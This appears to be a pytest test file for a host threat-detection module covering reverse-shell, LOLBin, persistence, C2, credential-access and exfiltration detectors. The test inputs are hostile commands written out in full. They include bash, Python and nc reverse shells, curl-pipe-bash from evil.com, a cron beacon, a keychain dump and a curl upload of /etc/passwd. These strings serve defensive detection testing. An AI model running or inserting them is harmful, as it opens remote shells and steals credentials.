"""
Tests for amoskys.agents.common.threat_detection

Covers the 7 threat detectors:
  - SuspiciousPathDetector
  - LOLBinDetector
  - ReverseShellDetector
  - PersistenceDetector
  - C2Detector
  - CredentialAccessDetector
  - ExfiltrationDetector
"""

import os

from amoskys.agents.common.threat_detection import (
    AttackPhase,
    C2Detector,
    CredentialAccessDetector,
    ExfiltrationDetector,
    LOLBinDetector,
    NetworkContext,
    PersistenceDetector,
    ReverseShellDetector,
    SuspiciousPathDetector,
    ThreatIndicator,
)

# ═══════════════════════════════════════════════════════════════════
# ThreatIndicator
# ═══════════════════════════════════════════════════════════════════


class TestThreatIndicator:
    def test_to_dict(self):
        ti = ThreatIndicator(
            indicator_type="test",
            value="test_value",
            confidence=0.9,
            attack_phase=AttackPhase.EXECUTION,
            mitre_techniques=["T1059"],
            description="Test indicator",
            source="test",
        )
        d = ti.to_dict()
        assert d["type"] == "test"
        assert d["confidence"] == 0.9
        assert d["phase"] == "execution"
        assert "T1059" in d["mitre"]


# ═══════════════════════════════════════════════════════════════════
# SuspiciousPathDetector
# ═══════════════════════════════════════════════════════════════════


class TestSuspiciousPathDetector:
    def test_tmp_is_suspicious(self):
        is_sus, reason = SuspiciousPathDetector.is_suspicious_path("/tmp/malware")
        assert is_sus is True
        assert "suspicious" in reason.lower()

    def test_var_tmp_is_suspicious(self):
        is_sus, _ = SuspiciousPathDetector.is_suspicious_path("/var/tmp/backdoor")
        assert is_sus is True

    def test_usr_bin_is_trusted(self):
        is_sus, _ = SuspiciousPathDetector.is_suspicious_path("/usr/bin/ls")
        assert is_sus is False

    def test_hidden_directory_is_suspicious(self):
        is_sus, reason = SuspiciousPathDetector.is_suspicious_path(
            "/home/user/.hidden/binary"
        )
        assert is_sus is True
        assert "hidden" in reason.lower()

    def test_suspicious_extension(self):
        is_sus, reason = SuspiciousPathDetector.is_suspicious_path(
            "/home/user/dropper.scpt"
        )
        assert is_sus is True
        assert ".scpt" in reason

    def test_random_hex_name(self):
        # High-entropy hex string: 16 unique chars out of 16 → entropy > 0.8
        is_sus, reason = SuspiciousPathDetector.is_suspicious_path(
            "/home/user/a1b2c3d4e5f60789"
        )
        assert is_sus is True
        assert "random" in reason.lower()

    def test_normal_path_not_suspicious(self):
        is_sus, _ = SuspiciousPathDetector.is_suspicious_path(
            "/Applications/Safari.app"
        )
        assert is_sus is False

    def test_get_suspicious_paths_darwin(self):
        paths = SuspiciousPathDetector.get_suspicious_paths("darwin")
        assert "/tmp/" in paths
        assert "/private/tmp/" in paths

    def test_get_suspicious_paths_linux(self):
        paths = SuspiciousPathDetector.get_suspicious_paths("linux")
        assert "/tmp/" in paths
        assert "/dev/shm/" in paths


# ═══════════════════════════════════════════════════════════════════
# LOLBinDetector
# ═══════════════════════════════════════════════════════════════════


class TestLOLBinDetector:
    def test_osascript_shell_script(self):
        result = LOLBinDetector.check_command(
            "osascript", "osascript -e 'do shell script \"whoami\"'"
        )
        assert result is not None
        assert result.indicator_type == "lolbin_abuse"
        assert "T1059.002" in result.mitre_techniques

    def test_curl_pipe_bash(self):
        result = LOLBinDetector.check_command(
            "curl", "curl https://evil.com/payload.sh | bash"
        )
        assert result is not None
        assert "T1105" in result.mitre_techniques

    def test_python_socket_import(self):
        result = LOLBinDetector.check_command(
            "python3", "python3 -c 'import socket; import subprocess'"
        )
        assert result is not None

    def test_normal_curl_not_flagged(self):
        result = LOLBinDetector.check_command(
            "curl", "curl https://api.example.com/data"
        )
        assert result is None

    def test_normal_python_not_flagged(self):
        result = LOLBinDetector.check_command("python3", "python3 /app/server.py")
        assert result is None


# ═══════════════════════════════════════════════════════════════════
# ReverseShellDetector
# ═══════════════════════════════════════════════════════════════════


class TestReverseShellDetector:
    def test_bash_reverse_shell(self):
        result = ReverseShellDetector.check_cmdline(
            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
        )
        assert result is not None
        assert result.indicator_type == "reverse_shell"
        assert result.confidence >= 0.9

    def test_python_reverse_shell(self):
        result = ReverseShellDetector.check_cmdline(
            "python -c 'import socket; import subprocess; s=socket.socket(); "
            's.connect(("10.0.0.1",4444)); subprocess.call(["/bin/sh"])\''
        )
        assert result is not None

    def test_nc_reverse_shell(self):
        result = ReverseShellDetector.check_cmdline("nc 10.0.0.1 4444 -e /bin/sh")
        assert result is not None

    def test_normal_command_not_flagged(self):
        result = ReverseShellDetector.check_cmdline("ls -la /tmp")
        assert result is None


# ═══════════════════════════════════════════════════════════════════
# PersistenceDetector
# ═══════════════════════════════════════════════════════════════════


class TestPersistenceDetector:
    def test_launch_agent_plist(self):
        result = PersistenceDetector.check_file_write(
            "/Library/LaunchAgents/com.evil.plist",
            b"<plist><dict><key>ProgramArguments</key></dict></plist>",
        )
        assert result is not None
        assert result.attack_phase == AttackPhase.PERSISTENCE

    def test_crontab_modification(self):
        result = PersistenceDetector.check_file_write(
            "/var/at/tabs/root",
            b"*/5 * * * * curl http://evil.com/beacon | sh",
        )
        assert result is not None

    def test_ssh_authorized_keys(self):
        result = PersistenceDetector.check_file_write(
            os.path.expanduser("~/.ssh/authorized_keys"),
            b"ssh-rsa AAAAB3NzaC1... attacker@evil.com",
        )
        assert result is not None

    def test_normal_file_not_flagged(self):
        result = PersistenceDetector.check_file_write(
            "/tmp/data.txt",
            b"just some data",
        )
        assert result is None


# ═══════════════════════════════════════════════════════════════════
# C2Detector
# ═══════════════════════════════════════════════════════════════════


class TestC2Detector:
    def test_c2_port_detected(self):
        conn = NetworkContext(
            src_ip="192.168.1.100",
            src_port=54321,
            dst_ip="8.8.8.8",
            dst_port=4444,  # Common C2 port
            protocol="TCP",
            bytes_in=10,
            bytes_out=5000,  # High outbound ratio triggers extra confidence
            direction="outbound",
        )
        result = C2Detector.check_connection(conn)
        assert result is not None
        assert result.attack_phase == AttackPhase.COMMAND_AND_CONTROL

    def test_normal_https_not_flagged(self):
        conn = NetworkContext(
            src_ip="192.168.1.100",
            src_port=54321,
            dst_ip="93.184.216.34",
            dst_port=443,
            protocol="TCP",
            bytes_in=1000,
            bytes_out=500,
            direction="outbound",
        )
        result = C2Detector.check_connection(conn)
        assert result is None


# ═══════════════════════════════════════════════════════════════════
# CredentialAccessDetector
# ═══════════════════════════════════════════════════════════════════


class TestCredentialAccessDetector:
    def test_keychain_access(self):
        result = CredentialAccessDetector.check_file_access(
            os.path.expanduser("~/Library/Keychains/login.keychain-db"),
            "read",
        )
        assert result is not None
        assert result.attack_phase == AttackPhase.CREDENTIAL_ACCESS

    def test_ssh_key_access(self):
        result = CredentialAccessDetector.check_file_access(
            os.path.expanduser("~/.ssh/id_rsa"),
            "read",
        )
        assert result is not None

    def test_security_command_dump(self):
        result = CredentialAccessDetector.check_command(
            "security dump-keychain -d login.keychain"
        )
        assert result is not None


# ═══════════════════════════════════════════════════════════════════
# ExfiltrationDetector
# ═══════════════════════════════════════════════════════════════════


class TestExfiltrationDetector:
    def test_curl_upload_detected(self):
        result = ExfiltrationDetector.check_command(
            "curl -X POST -d @/etc/passwd https://evil.com/exfil"
        )
        assert result is not None
        assert result.attack_phase == AttackPhase.EXFILTRATION

    def test_normal_command_not_flagged(self):
        result = ExfiltrationDetector.check_command(
            "curl https://api.example.com/status"
        )
        assert result is None
